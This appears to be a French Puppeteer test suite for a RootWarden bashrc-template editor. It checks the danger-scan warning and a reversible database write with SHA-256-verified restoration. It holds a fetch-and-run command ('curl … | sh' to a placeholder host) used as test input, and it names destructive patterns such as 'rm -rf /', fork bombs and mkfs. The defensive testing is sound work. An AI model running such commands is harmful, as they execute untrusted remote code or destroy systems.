/**
 * go-bashrc-b3.mjs - Sous-lot B3 de `bashrc/` : l'onglet Gabarit.
 *
 *   GET  /bashrc/template   lit le gabarit EN BASE
 *   POST /bashrc/template   l'ECRIT EN BASE — jamais sur une machine
 *
 * Vise les DEUX cibles :
 *   legacy   https://localhost:8443/bashrc/   (onglet « Template »)
 *   laravel  http://localhost:8444/bashrc     (onglet « Gabarit »)
 *
 * ══ CE QUE CE SOUS-LOT ECRIT, ET POURQUOI C'EST SUR ══════════════════════
 *
 * B3 est le premier sous-lot du module qui ECRIT. Rien ne part vers une
 * machine — mais **ce qui est ecrit est ce que TOUTES les machines recevraient**
 * au prochain deploiement. Trois precautions, dans cet ordre :
 *
 * 1. **Le contenu d'epreuve est INERTE.** C'est le gabarit d'origine plus UNE
 *    LIGNE DE COMMENTAIRE. Meme si la restauration echouait, les machines
 *    recevraient un `.bashrc` fonctionnel — un commentaire ne change aucun
 *    comportement. On ne se repose pas sur la restauration pour etre sur.
 * 2. **L'original est releve AVANT toute navigation**, contenu ET `updated_by`.
 *    Sauvegarder par l'interface pose `updated_by = <compte d'epreuve>` : une
 *    restauration du seul contenu laisserait la colonne modifiee.
 * 3. **La restauration est verifiee par un SHA-256**, pas par une longueur.
 *    Deux contenus de meme taille ne sont pas le meme contenu.
 *
 * ══ LE CONSTAT CENTRAL : LE SCAN DE DANGER EST CLIENT SEULEMENT ══════════
 *
 * `bashrcTemplateScanDanger()` teste le gabarit contre HUIT expressions —
 * `rm -rf /`, fork bomb, `mkfs`, `curl|sh`… — et ouvre un `confirm()` renforce
 * si l'une correspond. Le backend, lui, ne valide que la SYNTAXE (`bash -n`) et
 * la TAILLE (512 Ko).
 *
 * **Ce n'est PAS une faille**, et la suite ne le presente pas comme telle :
 * quiconque atteint cette route detient deja `can_manage_bashrc`, c'est-a-dire
 * l'autorisation explicite d'ecrire le fichier qui s'execute a chaque connexion.
 * Le scan n'est pas un controle d'acces : c'est un garde-fou pour la personne
 * qui edite.
 *
 * La propriete mesurable est donc de PRESENTATION : **l'ecran ne doit pas
 * laisser croire que ce scan est une barriere.** Un avertissement qui NOMME ce
 * qu'il a reconnu est honnete ; un bandeau « contenu valide » ne le serait pas.
 *
 * Usage : ./scripts/rejouer-lot.sh --legacy go-bashrc-b3
 */
import puppeteer from 'puppeteer';
import { createHmac } from 'crypto';
import { litEnBase, compteEnBase } from './lib-base.mjs';
import { mkdirSync } from 'node:fs';
import { constateArchivage } from './archive.mjs';

const BASE = process.env.E2E_BASE || 'https://localhost:8443';
const CIBLE = (() => {
    /*
     * ══ LA CIBLE VIENT DE L'ENVIRONNEMENT, L'URL N'EST QU'UN REPLI ════════
     *
     * `/8444|laravel/i.test(BASE)` deduit la cible d'un NUMERO DE PORT. Tant que
     * le portage vit sur 8444 c'est juste ; **le jour ou les ports s'echangent,
     * ce predicat rend 87 suites MENTEUSES et non rouges** — elles appliqueraient
     * les attentes du legacy au portage, et rendraient du VERT.
     *
     * `E2E_CIBLE` devient donc l'autorite, et `rejouer-lot.sh` l'exporte pour
     * chaque moitie. Le motif d'URL ne sert plus qu'aux lancements a la main.
     *
     * ⚠ ET IL N'Y A PAS DE GARDE DE COHERENCE ENTRE LES DEUX — c'est deliberé,
     * et l'inverse a ete demande puis ecarte apres mesure :
     *
     *     E2E_CIBLE=laravel + BASE=…:8443
     *       AVANT l'echange  incoherent   (a refuser)
     *       APRES l'echange  CORRECT      (a accepter)
     *
     * **Une garde « l'environnement doit concorder avec le motif d'URL »
     * refuserait exactement la configuration que cet elargissement existe pour
     * permettre.** Le motif d'URL n'est pas un invariant : c'est la chose meme
     * qu'on rend caduque. On ne garde pas une valeur contre une heuristique
     * qu'on sait perimee.
     *
     * CE QUI EST INVARIANT, ET SUR QUOI LA GARDE SE POSE : la cible appartient a
     * une LISTE FERMEE. Une valeur hors liste est refusee bruyamment, au
     * chargement, avant qu'une seule assertion ne s'execute — une faute de frappe
     * ne doit pas se lire comme « legacy » par repli silencieux.
     */
    const CIBLES = ['laravel', 'legacy'];
    const declaree = process.env.E2E_CIBLE;
    if (declaree !== undefined && declaree !== '') {
        if (! CIBLES.includes(declaree)) {
            throw new Error(
                `E2E_CIBLE=${JSON.stringify(declaree)} n'est pas une cible connue `
                + `(${CIBLES.join(' | ')}). Rien n'est joue : une cible inconnue `
                + `retomberait sur « legacy » et la suite mesurerait le mauvais portail.`);
        }

        return declaree;
    }

    return /8444|laravel/i.test(BASE) ? 'laravel' : 'legacy';
})();
const MDP = process.env.E2E_TEST_PASS || 'RootWarden@2026-Test!';

const COMPTE = 'rw-test-super';
const SECRET = 'MZXW6YTBOJSXG5BAMZXW6YTBOJSXG5BAMZXW6YTBOJSXG5BAMZXW';

const NOM_GABARIT = 'default';
/** Un COMMENTAIRE : inerte quoi qu'il arrive. Voir l'en-tete, precaution 1. */
const MARQUEUR = '# epreuve-b3 — ligne inerte posee par la suite de caracterisation';
/** Un motif que le scan CLIENT reconnait. Il n'est jamais SAUVEGARDE. */
const MOTIF_DANGEREUX = 'curl https://exemple.invalid/x | sh';

/** Rien ne doit partir vers une machine : B3 ne touche qu'a la base. */
const ROUTES_MACHINE = /\/bashrc\/(users|prerequisites|preview|deploy|restore|backups)/;

const DOSSIER_CAPTURES = new URL('./screenshots/bashrc', import.meta.url).pathname;

const C = CIBLE === 'laravel'
    ? {
        connexion: '/connexion',
        page: '/bashrc',
        onglet: '[data-rw="bashrc-onglet-gabarit"]',
        editeur: '[data-rw="bashrc-gabarit-editeur"]',
        danger: '[data-rw="bashrc-gabarit-danger"]',
        enregistrer: '[data-rw="bashrc-gabarit-enregistrer"]',
        annuler: '[data-rw="bashrc-gabarit-annuler"]',
        empreinte: '[data-rw="bashrc-gabarit-sha"]',
        cgu: /\/cgu/, accepte: '[data-rw="cgu-accepter"]',
    }
    : {
        connexion: '/auth/login.php?lang=fr',
        page: '/bashrc/',
        onglet: '.tab-btn[data-tab="template"]',
        editeur: '#tpl-editor',
        danger: '#tpl-danger',
        enregistrer: '#btn-tpl-save',
        annuler: '#btn-tpl-reset',
        empreinte: '#tpl-sha',
        cgu: /terms\.php/, accepte: 'button[name="accept_terms"]',
    };

let echecs = 0;
const lignes = [];
function note(l) { lignes.push(l); console.log(l); }
/** `d` n'est imprime QUE sur un FAIL ; `toujours` sort dans les deux verdicts. */
function verifie(l, ok, d, toujours) {
    const suffixe = toujours || (! ok && d) || '';
    note(`${ok ? 'PASS' : 'FAIL'}  ${l}${suffixe ? '  — ' + suffixe : ''}`);
    if (! ok) echecs += 1;
}
function constate(l, v) { note(`INFO  ${l} : ${v}`); }
/**
 * Assertion sur le portage, MESURE sur le legacy.
 *
 * Cote legacy, la ligne dit desormais SI la propriete tient. La redaction
 * precedente imprimait « ecart assume du legacy — <detail> » **meme quand elle
 * tenait** : le journal annoncait un ecart la ou il n'y en avait pas, et le
 * detail se lisait alors comme une contradiction (« affichee 9ee8e473, attendue
 * 9ee8e473 »).
 *
 * Meme famille que le detail d'echec imprime sur un PASS : une ligne qui affirme
 * toujours la meme chose ne mesure rien.
 */
function verifiePortage(l, ok, d, __quatrieme) {
    /*
     * INF-002 — LE QUATRIEME ARGUMENT N'EXISTE PAS ICI, ET IL NE PASSERA PLUS
     * EN SILENCE.
     *
     * Ce depot porte DEUX semantiques du troisieme argument, et elles sont
     * OPPOSEES : dans ce fichier (70 suites) le detail s'affiche sur un PASS
     * COMME sur un FAIL ; dans 12 autres, il ne s'affiche QUE sur un FAIL, et
     * un quatrieme argument y porte l'informatif. Rien ne les distingue a la
     * lecture d'un appel.
     *
     * Un appel a quatre arguments ecrit pour l'autre convention etait donc
     * SILENCIEUSEMENT tronque : le quatrieme ignore, et l'explication d'echec
     * imprimee sur des lignes VERTES. Quatre occurrences mesurees le
     * 2026-08-27, dont deux preexistantes. On ne le laisse plus arriver sans
     * bruit — et le message nomme le REMEDE, faute de quoi on le contourne en
     * retirant l'argument.
     */
    if (__quatrieme !== undefined) {
        throw new Error(
            'INF-002 : `verifie` de ce fichier prend TROIS arguments, et son detail '
            + 's\'affiche sur un PASS COMME sur un FAIL. Pour une explication qui ne '
            + 'doit paraitre qu\'en cas d\'echec, ecrire le troisieme argument ainsi : '
            + '`ok ? <ce qu\'on a mesure> : <ce qui explique l\'echec>`.');
    }

    if (CIBLE === 'laravel') return verifie(l, ok, ok ? '' : d);
    constate(l, ok ? 'verifie sur le legacy aussi' : `ecart assume du legacy — ${d}`);
}

function b32(s){const a='ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';let b='';for(const c of s.toUpperCase().replace(/=+$/,'')){const v=a.indexOf(c);if(v===-1)continue;b+=v.toString(2).padStart(5,'0')}const r=[];for(let i=0;i+8<=b.length;i+=8)r.push(parseInt(b.slice(i,i+8),2));return Buffer.from(r)}
function totp(s){const k=b32(s);const c=Math.floor(Date.now()/1000/30);const buf=Buffer.alloc(8);buf.writeBigUInt64BE(BigInt(c));const h=createHmac('sha1',k).update(buf).digest();const o=h[h.length-1]&0x0f;return((h.readUInt32BE(o)&0x7fffffff)%1000000).toString().padStart(6,'0')}
function dors(ms){return new Promise(r=>setTimeout(r,ms))}
function resteFenetre(){return 30 - (Math.floor(Date.now()/1000) % 30)}

/** L'empreinte du gabarit en base. Un SHA, pas une longueur. */
function empreinteEnBase() {
    const r = litEnBase(`SELECT SHA2(content, 256) FROM rootwarden.bashrc_templates `
        + `WHERE name = '${NOM_GABARIT}'`);

    return r[0] || '';
}
function auteurEnBase() {
    const r = litEnBase(`SELECT IFNULL(updated_by, 'NULL') FROM rootwarden.bashrc_templates `
        + `WHERE name = '${NOM_GABARIT}'`);

    return r[0] || '';
}

const navigateur = await puppeteer.launch({
    headless: 'new',
    args: ['--ignore-certificate-errors', '--allow-insecure-localhost', '--window-size=1400,900'],
    defaultViewport: { width: 1400, height: 900 },
    protocolTimeout: 180000,
});
const contextes = [];
const boites = [];
const versMachine = [];

async function connecte(nom, secret) {
    try { litEnBase('DELETE FROM rootwarden.login_attempts'); } catch { /* deja vide */ }
    const ctx = await navigateur.createBrowserContext();
    contextes.push(ctx);
    const page = await ctx.newPage();
    page.setDefaultTimeout(60000);
    const erreursJs = [];
    page.on('pageerror', (e) => erreursJs.push(String(e.message || e).split('\n')[0]));
    page.on('dialog', async (d) => {
        boites.push(`${d.type()} : ${(d.message() || '').replace(/\s+/g, ' ').slice(0, 120)}`);
        // ACCEPTER : la sauvegarde du gabarit est le geste que B3 mesure. Le
        // contenu ecrit est inerte (un commentaire), et l'original est restaure.
        try { await d.accept(); } catch {}
    });

    await page.setRequestInterception(true);
    page.on('request', (r) => {
        if (ROUTES_MACHINE.test(r.url())) {
            versMachine.push(`${r.method()} ${r.url().replace(/^https?:\/\/[^/]+/, '')}`);
            r.abort('blockedbyclient').catch(() => {});

            return;
        }
        r.continue().catch(() => {});
    });

    await page.goto(`${BASE}${C.connexion}`, { waitUntil: 'networkidle2' });
    await page.type('input[name="username"]', nom, { delay: 8 });
    await page.type('input[name="password"]', MDP, { delay: 8 });
    let nav = page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 20000 });
    await page.click('button[type="submit"]'); try { await nav; } catch {}
    if (resteFenetre() < 6) await dors((resteFenetre() + 1) * 1000);
    for (let essai = 0; essai < 2; essai += 1) {
        const champ = await page.$('input[name="2fa_code"]');
        if (! champ) break;
        if (essai > 0) await dors((resteFenetre() + 1) * 1000);
        await champ.click({ clickCount: 3 });
        await champ.type(totp(secret), { delay: 8 });
        nav = page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 20000 });
        await page.click('button[type="submit"]'); try { await nav; } catch {}
    }
    if (C.cgu.test(page.url())) {
        nav = page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 20000 });
        const b = await page.$(C.accepte);
        if (b) await b.evaluate((x) => x.click());
        try { await nav; } catch {}
    }

    return { ctx, page, erreursJs, surConnexion: /connexion|login\.php/.test(page.url()) };
}

let etapes = 0;
async function etape(titre, fn) {
    etapes += 1;
    try { await fn(); } catch (e) {
        verifie(`etape « ${titre} »`, false, String(e.message || e).split('\n')[0]);
    }
}

/**
 * LE NOM DE LA COPIE DE SAUVEGARDE.
 *
 * L'original est copie DANS LA MEME TABLE, sous un autre nom, et remis en place
 * a la fin. Le contenu ne transite jamais par le JS ni par un fichier : c'est du
 * SQL de bout en bout, donc exact.
 *
 * Premiere redaction : reconstruire l'original en RETIRANT la ligne posee, par
 * `REPLACE()` et `TRIM(TRAILING …)`. Elle a laisse le gabarit dans un troisieme
 * etat — ni l'original, ni celui qu'on venait d'ecrire. **Defaire un geste n'est
 * pas restaurer un etat.** Le gabarit a du etre remis a la main depuis le
 * fichier de repli du module, dont l'empreinte se trouvait etre celle d'origine.
 *
 * `_load_template` selectionne par nom : une ligne supplementaire n'est lue par
 * personne.
 */
const NOM_SAUVEGARDE = 'epreuve-b3-sauvegarde';
function copieLOriginal() {
    litEnBase(`DELETE FROM rootwarden.bashrc_templates WHERE name = '${NOM_SAUVEGARDE}'`);
    litEnBase(`INSERT INTO rootwarden.bashrc_templates (name, content, updated_by) `
        + `SELECT '${NOM_SAUVEGARDE}', content, updated_by FROM rootwarden.bashrc_templates `
        + `WHERE name = '${NOM_GABARIT}'`);
}
function remetLOriginal() {
    litEnBase(`UPDATE rootwarden.bashrc_templates d `
        + `JOIN rootwarden.bashrc_templates s ON s.name = '${NOM_SAUVEGARDE}' `
        + `SET d.content = s.content, d.updated_by = s.updated_by `
        + `WHERE d.name = '${NOM_GABARIT}'`);
    litEnBase(`DELETE FROM rootwarden.bashrc_templates WHERE name = '${NOM_SAUVEGARDE}'`);
}

// L'ORIGINAL EST RELEVE AVANT TOUTE NAVIGATION. S'il n'y en a pas, la suite
// s'arrete : sans reference, on ne saurait pas restaurer.
const EMPREINTE_ORIGINE = empreinteEnBase();
const AUTEUR_ORIGINE = auteurEnBase();
/**
 * En CARACTERES, pas en octets.
 *
 * `LENGTH()` compte des OCTETS, `CHAR_LENGTH()` des CARACTERES — et la `.value`
 * d'un `<textarea>` est en caracteres. Le gabarit fait 22 412 octets pour 17 814
 * caracteres : la premiere redaction comparait les deux et accusait la page de
 * charger un contenu tronque. **L'ecart de 4 598 « octets manquants » n'etait
 * que de l'UTF-8 multi-octets.**
 */
const TAILLE_ORIGINE = compteEnBase(`SELECT CHAR_LENGTH(content) FROM rootwarden.bashrc_templates `
    + `WHERE name = '${NOM_GABARIT}'`);

try {
    /*
     * ══ LE SUJET DE CETTE SUITE N'EXISTE PLUS COTE LEGACY ═════════════════
     *
     * Une suite de parite dont la moitie legacy a ete archivee ne doit pas
     * ECHOUER : un rouge permanent finit par ne plus etre lu, et il occupe la
     * place ou l'on aurait cherche une vraie regression. Elle CONSTATE, et sa
     * moitie portage continue de s'exercer.
     *
     * LE CONSTAT VIENT AVANT LA CONNEXION, et ce n'est pas un detail : la sonde
     * de `archive.mjs` n'ouvre pas de navigateur (Apache rend 404 pour un chemin
     * absent AVANT toute redirection de connexion). Se connecter d'abord ferait
     * consommer un code TOTP — dont le garde anti-rejeu est par COMPTE et
     * PERSISTANT — pour aller mesurer une page qui n'existe plus.
     *
     * ⚠ ET LE CONSTAT EXIGE UN 404, PAS UNE ABSENCE DE PAGE. Le 2026-09-05 ces
     * repertoires rendaient 403 : le `git mv` avait emporte les `.php` et laisse
     * le JavaScript, si bien que le dossier existait encore. `constateArchivage`
     * traite tout statut != 404 comme « encore servie » et rend `false` : le
     * constat aurait ete FAUX et la suite rouge quand meme. L'archivage a ete
     * acheve (`7588e71`) avant que cette ligne soit ecrite.
     */
    if (CIBLE === 'legacy') {
        const archivee = await constateArchivage({
            base: BASE, chemin: C.page, fichiers: [], verifie, constate,
        });
        if (archivee) throw new Error('__archivee__');
    }

    if (EMPREINTE_ORIGINE.length === 64) copieLOriginal();
    verifie('le gabarit d\'origine est releve', EMPREINTE_ORIGINE.length === 64, '',
        `sha256 ${EMPREINTE_ORIGINE.slice(0, 12)}… · ${TAILLE_ORIGINE} caracteres · updated_by=${AUTEUR_ORIGINE}`);
    if (EMPREINTE_ORIGINE.length !== 64) throw new Error('gabarit introuvable en base');

    const s = await connecte(COMPTE, SECRET);
    const { page, erreursJs } = s;
    verifie('la session a tenu', ! s.surConnexion, page.url());

    // ══ 1. L'ONGLET S'OUVRE ET LE GABARIT SE CHARGE ═══════════════════════
    await etape('l\'onglet Gabarit charge le gabarit reel', async () => {
        await page.goto(`${BASE}${C.page}`, { waitUntil: 'networkidle2' });
        const onglet = await page.$(C.onglet);
        verifie('l\'onglet Gabarit est atteignable', onglet !== null);
        if (! onglet) return;
        await onglet.click();
        await dors(4000);

        const vu = await page.evaluate((sels) => {
            const e = document.querySelector(sels.editeur);
            const sha = document.querySelector(sels.empreinte);

            return {
                present: e !== null,
                octets: e ? (e.value || '').length : 0,
                sha8: sha ? (sha.textContent || '').trim() : '',
            };
        }, { editeur: C.editeur, empreinte: C.empreinte });

        verifie('l\'editeur est rendu', vu.present);
        constate('taille chargee dans l\'editeur', `${vu.octets} caracteres`);
        constate('empreinte courte affichee', vu.sha8 || '(aucune)');

        // LA PROPRIETE : ce qui est a l'ecran est ce qui est EN BASE. Comparer
        // les tailles ne suffirait pas — on compare l'empreinte affichee aux
        // huit premiers caracteres du SHA-256 releve.
        verifie('l\'editeur charge le gabarit reellement stocke',
            vu.octets === TAILLE_ORIGINE, `${vu.octets} caracteres a l'ecran contre ${TAILLE_ORIGINE} en base`);
        verifiePortage('l\'empreinte affichee correspond a celle du contenu stocke',
            vu.sha8 !== '' && EMPREINTE_ORIGINE.startsWith(vu.sha8),
            `affichee « ${vu.sha8} », attendue « ${EMPREINTE_ORIGINE.slice(0, 8)} »`);
    });

    // ══ 2. LE SCAN DE DANGER — CE QU'IL EST, ET CE QU'IL N'EST PAS ════════
    await etape('un motif dangereux est reconnu, et NOMME', async () => {
        const editeur = await page.$(C.editeur);
        if (! editeur) { constate('scan de danger', '(non exercable — pas d\'editeur)'); return; }

        // On TAPE, on ne sauvegarde pas : taper n'ecrit rien.
        await editeur.click();
        await page.keyboard.down('Control'); await page.keyboard.press('End');
        await page.keyboard.up('Control');
        await page.type(C.editeur, '\n' + MOTIF_DANGEREUX, { delay: 4 });
        await dors(1200);

        const alerte = await page.evaluate((sel) => {
            const d = document.querySelector(sel);

            return {
                visible: d ? d.offsetParent !== null : false,
                texte: d ? (d.textContent || '').replace(/\s+/g, ' ').trim() : '',
            };
        }, C.danger);
        constate('avertissement de danger', `${alerte.visible ? 'visible' : 'masque'} — ${alerte.texte || '(vide)'}`);

        verifie('un motif dangereux declenche un avertissement', alerte.visible,
            'aucun avertissement pour `curl … | sh`');
        // ET IL NOMME CE QU'IL A RECONNU. Un avertissement qui dit seulement
        // « attention » ne permet pas de juger ; celui-ci doit citer le motif.
        verifie('l\'avertissement nomme le motif reconnu',
            /curl/i.test(alerte.texte), alerte.texte.slice(0, 90));
        // ET IL ENONCE SA PORTEE — c'est-a-dire CE QU'IL NE VERIFIE PAS.
        //
        // Premiere redaction : « le texte ne contient pas valid|verifi|conforme ».
        // Elle a echoue sur le portage, dont l'encart dit « Elle NE verifie NI ce
        // que fait le reste du fichier… » — un DESAVEU de validation, que le
        // motif attrapait comme une revendication. **Un test par mot-cle ne
        // distingue pas une affirmation de sa negation.**
        //
        // La propriete utile n'est pas l'absence d'un mot : c'est la presence
        // d'une limite. Le backend ne controle que la syntaxe ; un lecteur qui
        // ignore ce que la reconnaissance ne couvre pas lui pretera une portee
        // qu'elle n'a pas.
        verifiePortage('l\'avertissement enonce ce qu\'il ne verifie PAS',
            /\bne (verifie|controle|couvre|garantit)\b|\bdoes not (check|cover|guarantee)\b/i
                .test(alerte.texte),
            `aucune limite enoncee — « ${alerte.texte.slice(0, 80)} »`);
    });

    // ══ 3. ENREGISTRER ECRIT VRAIMENT, ET SEULEMENT EN BASE ═══════════════
    await etape('enregistrer ecrit le gabarit en base', async () => {
        const editeur = await page.$(C.editeur);
        if (! editeur) return;

        // Le contenu d'epreuve : l'original PLUS UN COMMENTAIRE. Inerte.
        await page.evaluate((sel, marqueur) => {
            const e = document.querySelector(sel);
            if (! e) return;
            // On retire d'abord la ligne dangereuse tapee a l'etape 2 : elle ne
            // doit JAMAIS etre sauvegardee.
            e.value = e.value.split('\n').filter((l) => ! /curl .* \| sh/.test(l)).join('\n')
                + '\n' + marqueur + '\n';
            e.dispatchEvent(new Event('input', { bubbles: true }));
        }, C.editeur, MARQUEUR);
        await dors(600);

        const bouton = await page.$(C.enregistrer);
        verifie('le bouton d\'enregistrement est atteignable', bouton !== null);
        if (! bouton) return;
        const desactive = await bouton.evaluate((b) => b.disabled);
        verifie('le bouton s\'active quand le contenu a change', ! desactive,
            'reste desactive alors que l\'editeur a change');

        const avant = empreinteEnBase();
        await bouton.click();
        await dors(6000);
        const apres = empreinteEnBase();

        constate('empreinte avant / apres', `${avant.slice(0, 12)}… → ${apres.slice(0, 12)}…`);
        verifie('enregistrer a bien change le gabarit en base', avant !== apres,
            'le contenu en base est inchange — l\'enregistrement n\'a pas abouti');
        verifie('le contenu ecrit contient bien le marqueur inerte',
            compteEnBase(`SELECT COUNT(*) FROM rootwarden.bashrc_templates `
                + `WHERE name = '${NOM_GABARIT}' AND content LIKE '%epreuve-b3%'`) === 1);
        constate('boites natives a l\'enregistrement', boites.length
            ? boites.map((b) => b.slice(0, 70)).join(' | ') : '(aucune)');
    });

    await etape('captures', async () => {
        const dossier = `${DOSSIER_CAPTURES}/${CIBLE}`;
        mkdirSync(dossier, { recursive: true });
        for (const [nom, l, h] of [['1920x1080', 1920, 1080], ['1400x900', 1400, 900], ['390x844', 390, 844]]) {
            await page.setViewport({ width: l, height: h });
            await dors(400);
            await page.screenshot({ path: `${dossier}/bashrc-b3-${nom}.png` });
        }
        verifie('les trois captures sont ecrites', true);
    });

    constate('erreurs JavaScript relevees', erreursJs.length ? erreursJs.join(' || ').slice(0, 200) : '(aucune)');
    verifiePortage('aucune erreur JavaScript sur la page', erreursJs.length === 0,
        erreursJs.slice(0, 2).join(' | '));

} catch (e) {
    // `__archivee__` n'est pas une panne : c'est la sortie NORMALE quand le
    // sujet legacy a ete archive. Le constat a deja tout dit.
    if (String(e && e.message || e).includes('__archivee__')) { /* rien a ajouter */ } else {
    verifie('deroulement de la suite', false, String(e.message || e).split('\n')[0]);
    }
} finally {
    // ══ LA RESTAURATION, ET SA PREUVE ═════════════════════════════════════
    try {
        if (EMPREINTE_ORIGINE.length === 64) {
            remetLOriginal();
            const restauree = empreinteEnBase();
            verifie('le gabarit d\'origine est restaure a l\'octet pres',
                restauree === EMPREINTE_ORIGINE,
                `sha ${restauree.slice(0, 12)}… au lieu de ${EMPREINTE_ORIGINE.slice(0, 12)}…`);
            verifie('l\'auteur du gabarit est restaure', auteurEnBase() === AUTEUR_ORIGINE,
                `updated_by=${auteurEnBase()} au lieu de ${AUTEUR_ORIGINE}`);
        }
    } catch (e) { note(`FAIL  restauration du gabarit : ${e.message}`); echecs += 1; }
    try {
        constate('requetes vers une machine, avortees', versMachine.length
            ? versMachine.join(' · ') : '(aucune)');
        verifie('B3 n\'a rien envoye vers une machine', versMachine.length === 0,
            versMachine.join(' · '));
    } catch (e) { note(`FAIL  controle des requetes : ${e.message}`); echecs += 1; }
    try {
        const zabbix = litEnBase("SELECT CONCAT(name,'|',ip) FROM rootwarden.machines WHERE id = 1");
        verifie('srv-zabbix est intacte', zabbix.length === 1 && zabbix[0] === 'srv-zabbix|192.168.0.244',
            zabbix[0] || '(absente)');
    } catch (e) { note(`FAIL  controle de srv-zabbix : ${e.message}`); echecs += 1; }
    try { for (const c of contextes) await c.close(); } catch (e) { note(`INFO  fermeture : ${e.message}`); }
    try { await navigateur.close(); } catch (e) { note(`INFO  fermeture : ${e.message}`); }
}

note(`\n${etapes} etapes, ${lignes.filter((l) => l.startsWith('PASS')).length} PASS, ${echecs} FAIL`);
note(echecs === 0 ? '=== TOUT OK ===' : '=== DES ECHECS ===');
process.exit(echecs === 0 ? 0 : 1);
